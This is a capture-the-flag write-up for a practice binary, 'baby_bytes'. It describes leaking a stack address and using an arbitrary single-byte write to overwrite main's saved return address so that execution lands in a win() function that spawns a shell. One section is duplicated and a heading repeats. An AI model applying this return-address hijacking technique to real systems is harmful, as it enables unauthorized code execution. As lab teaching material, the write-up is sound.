# Baby Bytes Challenge Writeup

## Challenge Overview

- **Binary**: `baby_bytes` (x86_64 Linux, non-PIE)  
- **Goal**: Trigger the `win()` function to get a shell  
- **Provided primitives**:  
  - **Leak**: Address of `choice` (stack pointer) via  
    ```c
    printf("Here's your address of choice: %p\n", &choice);
    ```  
  - **Arbitrary single-byte read** (option 1)  
  - **Arbitrary single-byte write** (option 2) at any address  

## Vulnerability

- The program loops:  
  1. `scanf("%d", &choice);`  
  2. If `choice == 1`, read a byte at an arbitrary address  
  3. If `choice == 2`, write a byte at an arbitrary address (with `mprotect` to RWX)  
  4. Otherwise, exit  
- **No PIE**: code, GOT, and `.text` are at fixed addresses  
- **Stack ASLR**: only the stack is randomized, but we leak one stack address (`&choice`)

## Exploitation Strategy

1. **Target**: overwrite `main`’s saved return address on the stack so that `leave; ret` lands in `win()`.  
2. **Locate addresses**:  
   - Leak gives `&choice = leak_addr`  
   - In this binary, `saved_rip_addr = leak_addr + 0x1C`  
3. **Craft writes**:  
   - Obtain `WIN_ADDR` (address of `win()`, e.g. `0x401289`)  
   - Convert to an 8-byte little-endian array  
   - For each byte index `i` in `0…7`, use option 2 to write that byte to `saved_rip_addr + i`  
4. **Trigger**: send invalid menu choice (e.g. `3`) to break the loop, causing `main` to `ret` into `win()`

## Detailed Steps

### 1. Leak the stack address

$ ./baby_bytes
Here's your address of choice (pun intended): 0x7ffd5383f59c
You need to call the function at this address to win: 0x401289

### 2. Compute saved_rip_addr
choice     = 0x7ffd5383f59c
saved_rip = choice + 0x1C

### 2. Compute saved_rip_addr
choice     = 0x7ffd5383f59c
saved_rip = choice + 0x1C

### 3. Overwrite return address byte-by-byte
WIN_ADDR = 0x401289
Little-endian bytes: [0x89, 0x12, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00]

### 4. Trigger the hijack
> 3
Invalid option! Exiting...
$    # now you’re in win() → shell

## Detailed Steps
By leaking a single stack address and using the arbitrary-byte write primitive, we redirect execution into win() by overwriting main’s return address. Once the loop exits, the ret lands in win(), spawning a shell.